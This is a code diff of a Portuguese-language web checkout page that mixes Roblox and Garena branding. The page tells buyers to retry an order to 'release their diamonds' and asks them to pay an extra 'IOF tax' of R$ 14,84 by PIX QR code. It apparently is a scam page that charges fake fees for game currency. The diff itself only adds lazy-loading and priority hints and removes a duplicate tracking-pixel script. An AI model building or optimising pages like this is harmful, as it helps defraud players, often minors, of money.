@@ -125,17 +125,17 @@
   </style>
 <script async="" defer="" src="js/pixel_1.js"></script>
 <script src="js/utm-capture.js"></script>
-<script async="" defer="" src="js/pixel.js"></script><script src="/pixel.js"></script>
+<script src="/pixel.js"></script>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <img src="images/roblox-logo-1.png" class="logo" alt="Logo Garena">
+      <img src="images/roblox-logo-1.png" class="logo" alt="Logo Garena" fetchpriority="high">
     </div>
     
 
     <div class="banner">
-      <img src="images/banner-loja.jpg" alt="Banner Checkout" style="width:100%; height:auto;">
+      <img src="images/banner-loja.jpg" alt="Banner Checkout" style="width:100%; height:auto;" loading="lazy" decoding="async">
     </div>
     
     <!-- Barra de carregamento -->
@@ -284,7 +284,7 @@ Faça uma nova tentativa para concluir seu pedido e liberar seus diamantes.
           <h2 style="font-size: 20px; font-weight: bold; color: #333; margin-bottom: 16px;">Pagamento Taxa IOF</h2>
           <p style="color: #666; margin-bottom: 20px; font-size: 14px;">Escaneie o QR Code abaixo ou copie o código para pagar a taxa de R$ 14,84.</p>
           
-          <img id="pix-qrcode-img" src="" alt="QR Code PIX" style="width: 200px; height: 200px; margin: 0 auto 20px; display: block; border: 1px solid #eee; padding: 8px; border-radius: 8px;">
+          <img id="pix-qrcode-img" src="" alt="QR Code PIX" style="width: 200px; height: 200px; margin: 0 auto 20px; display: block; border: 1px solid #eee; padding: 8px; border-radius: 8px;" loading="lazy" decoding="async">
           
           <div style="display: flex; gap: 8px; margin-bottom: 8px;">
               <input type="text" id="pix-copy-text" readonly="" style="flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 6px; font-size: 12px; color: #555; background: #f9f9f9;">
